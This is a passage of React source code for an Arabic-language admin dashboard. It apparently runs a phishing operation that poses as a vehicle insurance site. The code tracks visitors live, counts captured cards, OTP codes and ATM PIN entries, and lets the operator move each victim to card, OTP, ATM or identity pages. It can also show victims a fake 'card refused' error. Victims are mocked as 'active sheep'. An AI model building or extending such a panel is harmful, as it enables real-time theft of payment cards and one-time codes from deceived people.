      // Sound for new visitors
      if (soundEnabled && visitorsData.visitors.length > 0 && !isInitialLoadRef.current) {
        const newVisitors = visitorsData.visitors.filter((v) => !lastSeenVisitorIdsRef.current.has(v.id));
        for (const visitor of newVisitors) {
          playVisitorSound();
          lastSeenVisitorIdsRef.current.add(visitor.id);
        }
      }

      // Update tracking info
      const trackingMap: Record<string, SessionTrackingInfo> = {};
      trackedSessions.sessions.forEach((session) => {
        trackingMap[session.sessionId] = session;
      });
      setTrackingInfo(trackingMap);
      
      // Mark initial load complete and populate seen IDs
      if (isInitialLoadRef.current && submissionsResponse.submissions.length > 0) {
        isInitialLoadRef.current = false;
        submissionsResponse.submissions.forEach((row) => lastSeenIdsRef.current.add(row.id));
        visitorsData.visitors.forEach((v) => lastSeenVisitorIdsRef.current.add(v.id));
      }
    } catch (error) {
      console.error("Failed to load admin data:", error);
      if (error instanceof Error && (error.message.includes("Unauthorized") || error.message.includes("401"))) {
        logoutAdmin();
        setLocation("/admin");
      }
    }
  }, [setLocation, soundEnabled]);

  useEffect(() => {
    void fetchData();
    const id = window.setInterval(() => {
      void fetchData();
    }, 1000);
    intervalRef.current = id;
    return () => {
      if (intervalRef.current) window.clearInterval(intervalRef.current);
    };
  }, [fetchData]);

  useEffect(() => {
    setSelectedIds((current) => current.filter((sessionId) => Object.keys(sessions).includes(sessionId)));
  }, [sessions]);

  const handleLogout = useCallback(() => {
    logoutAdmin();
    setLocation("/admin");
  }, [setLocation]);

  const handleLogoutAll = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    await adminLogoutAll(token);
    logoutAdmin();
    setLocation("/admin");
  }, [setLocation]);

  const handleChangePassword = useCallback(async () => {
    const token = getToken();
    if (!token) return;
    if (!passwordValue.trim()) {
      setPasswordStatus("أدخل كلمة مرور جديدة");
      return;
    }
    try {
      await adminChangePassword(token, passwordValue.trim());
      setPasswordStatus("تم تغيير كلمة المرور بنجاح.");
      setPasswordValue("");
    } catch (error) {
      console.error(error);
      setPasswordStatus("فشل تغيير كلمة المرور.");
    }
  }, [passwordValue]);

  const handleSaveSettings = useCallback(() => {
    // Save to API server (this is the primary storage)
    saveApiSettings(settings)
      .then(() => {
        // Also save to localStorage for offline access
        saveAdminSettings(settings);
        setSettingsOpen(false);
      })
      .catch((error) => {
        console.error("Failed to save settings to server:", error);
        // Still save locally as fallback
        saveAdminSettings(settings);
        setSettingsOpen(false);
      });
  }, [settings]);

  const handleBlock = useCallback((sessionId: string, ownerName?: string) => {
    blockSession(sessionId, ownerName, "محظور بواسطة الإدارة");
    setBlockedSessions(getBlockedSessions());
  }, []);

  const handleUnblock = useCallback((sessionId: string) => {
    unblockSession(sessionId);
    setBlockedSessions(getBlockedSessions());
  }, []);

  const handleDeleteSession = useCallback((sessionId: string) => {
    const rows = sessions[sessionId] ?? [];
    rows.forEach((row) => {
      moveSubmissionToTrash({
        id: row.id,
        sessionId: row.sessionId,
        type: row.type,
        data: row.data,
        ipAddress: row.ipAddress,
        createdAt: row.createdAt,
        ownerName: parseData(rows[0]?.data ?? null).ownerName,
      });
    });
    setTrashItems(getTrashItems());
    setSelectedIds((current) => current.filter((id) => id !== sessionId));
  }, [sessions]);

  const handleDeleteSelected = useCallback(() => {
    selectedIds.forEach((sessionId) => handleDeleteSession(sessionId));
  }, [selectedIds, handleDeleteSession]);

  const handleRestoreTrash = useCallback((itemId: number) => {
    restoreTrashItem(itemId);
    setTrashItems(getTrashItems());
  }, []);

  const handleDeleteTrashItem = useCallback((itemId: number) => {
    deleteTrashItem(itemId);
    setTrashItems(getTrashItems());
  }, []);

  const handleEmptyTrash = useCallback(() => {
    clearTrash();
    setTrashItems([]);
  }, []);

  const handleControlAction = useCallback(async (sessionId: string, action: string, code?: string, authorize?: boolean) => {
    const token = getToken();
    if (!token) {
      toast("error", "خطأ في التوثيق", "لم يتم العثور على رمز الدخول");
      return;
    }
    
    try {
      const result = await sendAdminControl(sessionId, action, token, code, authorize);
      
      // Map action to page name for display
      const pageNames: Record<string, string> = {
        go_home: "الصفحة الرئيسية",
        go_form: "بيانات المركبة",
        go_select: "اختيار التأمين",
        go_visa: "صفحة الفيزا",
        go_otp: "صفحة OTP",
        go_otp2: "صفحة OTP 2",
        go_otp3: "صفحة OTP 3",
        go_atm: "صفحة ATM",
        go_nomer: "رقم الجوال",
        go_nomer_wait: "انتظار رقم الجوال",
        go_nomer_otp: "تحقق رقم الجوال",
        go_identity_check: "التحقق من الهوية",
        go_total: "الإجمالي",
        go_total2: "الإجمالي 2",
        go_waiting: "قائمة الانتظار",
        card_error: "إبلاغ خطأ البطاقة",
        nomer_error: "إبلاغ خطأ الرقم",
        identity_code: "إرسال رمز الهوية",
      };
      
      const pageName = pageNames[action] || action;
      
      if (result.success) {
        if (action === "card_error") {
          toast("success", "تم إرسال إشعار الخطأ", "تم إبلاغ العميل بأن البطاقة مرفوضة");
        } else {
          toast("success", "تم تحويل العميل", `تم التوجيه إلى: ${pageName}`);
        }
      }
    } catch (error) {
      console.error("Error sending control:", error);
      toast("error", "خطأ في التنفيذ", "فشل في إرسال الأمر للخادم");
    }
    
    await fetchData();
  }, [fetchData]);

  const blockedMap = useMemo(() => Object.fromEntries(blockedSessions.map((entry) => [entry.sessionId, entry])), [blockedSessions]);
  const sessionCount = Object.keys(sessions).length;
  const cardCount = stats?.byType.find((item) => item.type === "card")?.count ?? 0;
  const otpCount = stats?.byType.filter((item) => item.type.startsWith("otp")).reduce((sum, item) => sum + item.count, 0) ?? 0;
  const atmCount = stats?.byType.find((item) => item.type === "atm")?.count ?? 0;
  const pendingCount = Object.values(sessions).filter((rows) => rows.some((r) => r.type === "card") && !rows.some((r) => r.type.startsWith("otp"))).length;
  const blockedCount = blockedSessions.length;
  const trashedCount = trashItems.length;
  const allSelected = sessionCount > 0 && selectedIds.length === sessionCount;
  
  // عدد العملاء المتصلين حالياً (isOnline: true)
  const onlineCount = Object.values(trackingInfo).filter((s) => s.isOnline).length;

  return (
    <div className="min-h-screen bg-slate-100" dir="rtl">
      {/* Mobile-First Header */}
      <header className="sticky top-0 z-30 border-b border-slate-200 bg-white/95 backdrop-blur-lg safe-area-pb">
        <div className="px-3 py-3">
          {/* Title Row */}
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2">
              <ShieldCheck className="w-5 h-5 text-blue-600" />
              <h1 className="text-base font-bold text-slate-900">لوحة التحكم</h1>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={() => setSoundEnabled(!soundEnabled)}
                className={`p-2 rounded-xl ${soundEnabled ? "bg-green-500 text-white" : "bg-red-500 text-white"} active:opacity-80`}
                title={soundEnabled ? "إيقاف الصوت" : "تشغيل الصوت"}
              >
                {soundEnabled ? <Volume2 className="w-5 h-5" /> : <VolumeX className="w-5 h-5" />}
              </button>
              <button
                onClick={() => setMenuOpen(!menuOpen)}
                className="p-2 rounded-xl bg-blue-500 text-white active:bg-blue-600"
              >
                {menuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
              </button>
              <button
                onClick={handleLogout}
                className="p-2 rounded-xl bg-slate-100 text-slate-600 active:bg-slate-200"
              >
                <LogOut className="w-5 h-5" />
              </button>
            </div>
          </div>

          {/* Menu Dropdown */}
          {menuOpen && (
            <div className="mt-3 p-3 bg-white rounded-2xl border border-slate-200 shadow-lg space-y-2">
              <button
                onClick={() => { setActiveSection("stats"); setMenuOpen(false); }}
                className={`w-full flex items-center gap-3 p-3 rounded-xl text-right transition-colors ${
                  activeSection === "stats" ? "bg-blue-50 text-blue-700" : "bg-slate-50 text-slate-700 hover:bg-slate-100"
                }`}
              >
                <BarChart3 className="w-5 h-5" />
                <span className="font-medium">📊 الإحصائيات</span>
              </button>
              <button
                onClick={() => { setActiveSection("security"); setMenuOpen(false); }}
                className={`w-full flex items-center gap-3 p-3 rounded-xl text-right transition-colors ${
                  activeSection === "security" ? "bg-blue-50 text-blue-700" : "bg-slate-50 text-slate-700 hover:bg-slate-100"
                }`}
              >
                <Settings className="w-5 h-5" />
                <span className="font-medium">🔒 الأمان</span>
              </button>
              <button
                onClick={() => { setActiveSection("offers"); setMenuOpen(false); }}
                className={`w-full flex items-center gap-3 p-3 rounded-xl text-right transition-colors ${
                  activeSection === "offers" ? "bg-blue-50 text-blue-700" : "bg-slate-50 text-slate-700 hover:bg-slate-100"
                }`}
              >
                <CreditCard className="w-5 h-5" />
                <span className="font-medium">💰 العروض</span>
              </button>
              <button
                onClick={() => { setActiveSection("sessions"); setMenuOpen(false); }}
                className={`w-full flex items-center gap-3 p-3 rounded-xl text-right transition-colors ${
                  activeSection === "sessions" ? "bg-blue-50 text-blue-700" : "bg-slate-50 text-slate-700 hover:bg-slate-100"
                }`}
              >
                <Users className="w-5 h-5" />
                <span className="font-medium">👥 الجلسات</span>
              </button>
              <button
                onClick={() => { setActiveSection("visitors"); setMenuOpen(false); }}
                className={`w-full flex items-center gap-3 p-3 rounded-xl text-right transition-colors ${
                  activeSection === "visitors" ? "bg-blue-50 text-blue-700" : "bg-slate-50 text-slate-700 hover:bg-slate-100"
                }`}
              >
                <Eye className="w-5 h-5" />
                <span className="font-medium">👁️ الزوار</span>
              </button>
            </div>
          )}
        </div>
      </header>

      <main className="px-3 py-4 space-y-4">
        {/* Stats Section */}
        {activeSection === "stats" && (
          <div className="space-y-4">
            <h2 className="text-lg font-bold text-slate-900">📊 الإحصائيات</h2>
            <div className="grid grid-cols-2 gap-3">
              <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
                <div className="text-3xl font-bold text-slate-900">{sessionCount}</div>
                <div className="text-sm text-slate-500">الجلسات</div>
              </div>
              <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
                <div className="text-3xl font-bold text-red-600">{cardCount}</div>
                <div className="text-sm text-slate-500">البطاقات</div>
              </div>
              <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
                <div className="text-3xl font-bold text-orange-600">{otpCount}</div>
                <div className="text-sm text-slate-500">OTP</div>
              </div>
              <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
                <div className="text-3xl font-bold text-teal-600">{atmCount}</div>
                <div className="text-sm text-slate-500">ATM</div>
              </div>
              <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
                <div className="text-3xl font-bold text-blue-600">{pendingCount}</div>
                <div className="text-sm text-slate-500">ينتظر</div>
              </div>
              <div className="rounded-2xl border border-slate-200 bg-white p-4 text-center">
                <div className="text-3xl font-bold text-red-600">{blockedCount}</div>
                <div className="text-sm text-slate-500">محظور</div>
              </div>
            </div>
            <button
              onClick={fetchData}
              className="w-full flex items-center justify-center gap-2 rounded-xl bg-blue-500 text-white py-3 text-sm font-medium active:bg-blue-600"
            >
              🔄 تحديث البيانات
            </button>
          </div>
        )}

        {/* Security Section */}
        {activeSection === "security" && (
          <div className="space-y-4">
            <h2 className="text-lg font-bold text-slate-900">🔒 الأمان</h2>
            <button
              onClick={() => setPasswordOpen(true)}
              className="w-full flex items-center justify-center gap-3 rounded-xl bg-slate-100 text-slate-700 py-4 text-sm font-medium active:bg-slate-200"
            >
              <KeyRound className="w-5 h-5" />
              تغيير كلمة المرور
            </button>
            <button
              onClick={handleLogoutAll}
              className="w-full flex items-center justify-center gap-3 rounded-xl bg-red-50 text-red-600 py-4 text-sm font-medium active:bg-red-100"
            >
              <LogOut className="w-5 h-5" />
              خروج من جميع الأجهزة
            </button>
          </div>
        )}

        {/* Offers Section */}
        {activeSection === "offers" && (
          <div className="space-y-4">
            <h2 className="text-lg font-bold text-slate-900">💰 العروض</h2>
            <button
              onClick={() => setSettingsOpen(true)}
              className="w-full flex items-center justify-center gap-3 rounded-xl bg-blue-500 text-white py-4 text-sm font-medium active:bg-blue-600"
            >
              <Settings className="w-5 h-5" />
              تحديث أسعار التأمين
            </button>
          </div>
        )}

        {/* Visitors Section */}
        {activeSection === "visitors" && (
          <div className="space-y-4">
            <h2 className="text-lg font-bold text-slate-900">👁️ الزوار</h2>
            <p className="text-sm text-slate-500">{visitors.length} زائر</p>
            {visitors.length === 0 ? (
              <div className="rounded-2xl border-2 border-dashed border-slate-300 bg-slate-50 p-8 text-center">
                <p className="text-sm text-slate-500">لا يوجد زوار حالياً</p>
              </div>
            ) : (
              <div className="space-y-3">
                {visitors.map((visitor) => (
                  <div key={visitor.id} className="rounded-2xl border border-slate-200 bg-white p-4">
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <span className={`w-3 h-3 rounded-full ${visitor.visitCount > 1 ? "bg-orange-500" : "bg-green-500"}`} />
                        <span className="font-bold text-slate-900">
                          {visitor.ownerName || "زائر جديد"}
                        </span>
                      </div>
                      <span className="text-xs text-slate-400">#{visitor.sessionId.slice(0, 8)}</span>
                    </div>
                    <div className="text-xs text-slate-500 space-y-1">
                      <div className="flex items-center gap-2">
                        <span>زيارات:</span>
                        <span className="font-medium">{visitor.visitCount}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <span>أول زيارة:</span>
                        <span className="font-medium" dir="ltr">{new Date(visitor.firstVisit).toLocaleDateString("ar-SA")}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <span>آخر زيارة:</span>
                        <span className="font-medium" dir="ltr">{new Date(visitor.lastVisit).toLocaleDateString("ar-SA")}</span>
                      </div>
                      {visitor.ipAddress && (
                        <div className="flex items-center gap-2">
                          <span>IP:</span>
                          <span className="font-mono" dir="ltr">{visitor.ipAddress}</span>
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Sessions Section - Mobile Optimized */}
        {activeSection === "sessions" && (
          <>
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-sm font-semibold text-slate-900">الجلسات النشطة</h2>
                <p className="text-xs text-slate-500">{showOnlineOnly ? onlineSessionCount : sessionCount} جلسة • {cardCount} بطاقة</p>
              </div>
              <div className="flex items-center gap-2">
                <div className="px-3 py-1.5 rounded-xl bg-green-50 text-green-700 text-xs font-medium">
                  <span className="font-bold">{onlineCount}</span> متصل الآن
                </div>
                <button
                  onClick={() => setShowOnlineOnly(!showOnlineOnly)}
                  className={`px-3 py-1.5 rounded-xl text-xs font-medium transition-colors ${
                    showOnlineOnly 
                      ? "bg-green-500 text-white active:bg-green-600" 
                      : "bg-slate-100 text-slate-600 active:bg-slate-200"
                  }`}
                >
                  {showOnlineOnly ? "🟢 خرفان نشطين" : "○ خرفان نشطين"}
                </button>
                {selectedIds.length > 0 && (
                  <button
                    onClick={handleDeleteSelected}
                    className="px-3 py-1.5 rounded-xl bg-red-50 text-red-600 text-xs font-medium active:bg-red-100"
                  >
                    حذف ({selectedIds.length})
                  </button>
                )}
                <button
                  onClick={() => { allSelected ? setSelectedIds([]) : setSelectedIds(Object.keys(sessions)); }}
                  className="px-3 py-1.5 rounded-xl bg-slate-100 text-slate-600 text-xs font-medium active:bg-slate-200"
                >
                  {allSelected ? "إلغاء" : "تحديد الكل"}
                </button>
              </div>
            </div>

            {/* Sessions List */}
            {Object.keys(filteredSessions).length === 0 ? (
              <div className="rounded-2xl border-2 border-dashed border-slate-300 bg-slate-50 p-8 text-center">
                <p className="text-sm text-slate-500">
                  {showOnlineOnly ? "لا يوجد عملاء متصلين حالياً" : "لا يوجد جلسات حالياً"}
                </p>
              </div>
            ) : (
              <div className="space-y-3">
                {Object.entries(filteredSessions).map(([sessionId, rows]) => (
                  <SessionBox
                    key={sessionId}
                    sessionId={sessionId}
                    rows={rows}
                    selected={selectedIds.includes(sessionId)}
                    onToggleSelect={() => {
                      setSelectedIds((current) => current.includes(sessionId)
                        ? current.filter((id) => id !== sessionId)
                        : [...current, sessionId]);
                    }}
                    blocked={blockedMap[sessionId]?.message}
                    onControl={handleControlAction}
                    onBlock={() => handleBlock(sessionId, parseData(rows[0]?.data ?? null).ownerName)}
                    onUnblock={() => handleUnblock(sessionId)}
                    onDelete={() => handleDeleteSession(sessionId)}
                    onOpenHistory={() => setHistoryDialog({ sessionId, rows })}
                    currentPage={trackingInfo[sessionId]?.currentPage}
                    isOnline={trackingInfo[sessionId]?.isOnline}
                    newCardId={newCardId}
                    onViewCard={() => setNewCardId(null)}
                  />
                ))}
              </div>
            )}
          </>
        )}
      </main>

      <SessionHistoryDialog
        open={Boolean(historyDialog)}
        rows={historyDialog?.rows ?? []}
        onClose={() => setHistoryDialog(null)}
      />

      <Dialog open={settingsOpen} onOpenChange={setSettingsOpen}>
        <DialogContent className="sm:max-w-[720px] max-h-[85vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>إعدادات العروض</DialogTitle>
          </DialogHeader>
          <ScrollArea className="flex-1 mt-4">
            <div className="space-y-4">
              {settings.offers.map((offer, index) => (
                <div key={offer.id} className="rounded-3xl border border-slate-200 bg-white p-4">
                  <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-lg bg-slate-100 p-1 overflow-hidden shrink-0">
                        {offer.imageUrl ? (
                          <img src={offer.imageUrl} alt={offer.name} className="w-full h-full object-contain" />
                        ) : (
                          <div className="w-full h-full flex items-center justify-center text-slate-400 text-lg font-bold">
                            {offer.name.charAt(0)}
                          </div>
                        )}
                      </div>
                      <div>
                        <div className="text-sm font-semibold text-slate-900">{offer.name} ({offer.type})</div>
                        <p className="text-xs text-slate-500">رابط الشعار</p>
                      </div>
                    </div>
                    <input
                      type="text"
                      placeholder="رابط الصورة..."
                      value={offer.imageUrl || ""}
                      onChange={(event) => {
                        const nextOffers = [...settings.offers];
                        nextOffers[index] = { ...offer, imageUrl: event.target.value };
                        setSettings({ ...settings, offers: nextOffers });
                      }}
                      className="w-full max-w-[200px] rounded-3xl border border-slate-300 bg-slate-50 px-3 py-2 text-sm text-slate-900"
                    />
                  </div>
                  <div className="mt-3 pt-3 border-t border-slate-100">
                    <div className="flex items-center justify-between">
                      <span className="text-xs text-slate-500">السعر</span>
                      <input
                        type="number"
                        value={offer.price}
                        onChange={(event) => {
                          const nextOffers = [...settings.offers];
                          nextOffers[index] = { ...offer, price: Number(event.target.value) };
                          setSettings({ ...settings, offers: nextOffers });
                        }}
                        className="w-full max-w-[140px] rounded-3xl border border-slate-300 bg-slate-50 px-3 py-1.5 text-sm text-slate-900"
                      />
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </ScrollArea>
          <div className="mt-4 flex flex-wrap justify-end gap-2">
            <Button size="sm" variant="outline" onClick={() => setSettingsOpen(false)}>إلغاء</Button>
            <Button size="sm" onClick={handleSaveSettings}>حفظ</Button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={passwordOpen} onOpenChange={setPasswordOpen}>
        <DialogContent className="sm:max-w-[480px] max-h-[80vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>تغيير كلمة المرور</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 mt-4">
            <label className="block text-xs font-semibold text-slate-600">كلمة المرور الجديدة</label>
            <input
              type="password"
              value={passwordValue}
              onChange={(event) => setPasswordValue(event.target.value)}
              className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-3 py-2 text-sm"
            />
            {passwordStatus && <div className="text-xs text-slate-500">{passwordStatus}</div>}
            <div className="flex flex-wrap justify-end gap-2">
              <Button size="sm" variant="outline" onClick={() => setPasswordOpen(false)}>إلغاء</Button>
              <Button size="sm" onClick={handleChangePassword}>حفظ</Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={trashOpen} onOpenChange={setTrashOpen}>
        <DialogContent className="sm:max-w-[720px] max-h-[85vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>سلة المهملات</DialogTitle>
          </DialogHeader>
          <div className="px-4 pb-4">
            <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
              <p className="text-sm text-slate-600">يمكنك استعادة أو حذف العناصر نهائيًا.</p>
              <button
                type="button"
                onClick={handleEmptyTrash}
                className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
              >إفراغ المهملات</button>
            </div>
          </div>
          <ScrollArea className="flex-1 px-4 pb-4">
            {trashItems.length === 0 ? (
              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-8 text-center text-slate-500">لا يوجد عناصر في المهملات</div>
            ) : (
              <div className="space-y-4">
                {trashItems.map((item) => (
                  <div key={`${item.sessionId}-${item.id}`} className="rounded-3xl border border-slate-200 bg-white p-4">
                    <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                      <div className="text-right">
                        <p className="text-sm font-semibold text-slate-900">#{item.sessionId.slice(0, 8)}</p>
                        <p className="text-xs text-slate-500">{item.type} • {formatAgo(item.deletedAt)}</p>
                      </div>
                      <div className="flex flex-wrap gap-2">
                        <button
                          type="button"
                          onClick={() => handleRestoreTrash(item.id)}
                          className="rounded-3xl border border-blue-200 bg-blue-50 px-3 py-2 text-xs text-blue-700 hover:bg-blue-100"
                        >استعادة</button>
                        <button
                          type="button"
                          onClick={() => handleDeleteTrashItem(item.id)}
                          className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
                        >حذف نهائي</button>
                      </div>
                    </div>
                    <div className="mt-3 grid gap-2 sm:grid-cols-2 text-xs text-slate-500">
                      <div>IP: {item.ipAddress ?? "غير معروف"}</div>
                      <div>وقت الحذف: {new Date(item.deletedAt).toLocaleString("ar-EG")}</div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </ScrollArea>
          <div className="mt-4 flex justify-end gap-2 px-4 pb-4">
            <Button size="sm" variant="outline" onClick={() => setTrashOpen(false)}>إغلاق</Button>
          </div>
        </DialogContent>
      </Dialog>

      <ToastContainer />
    </div>
  );
}
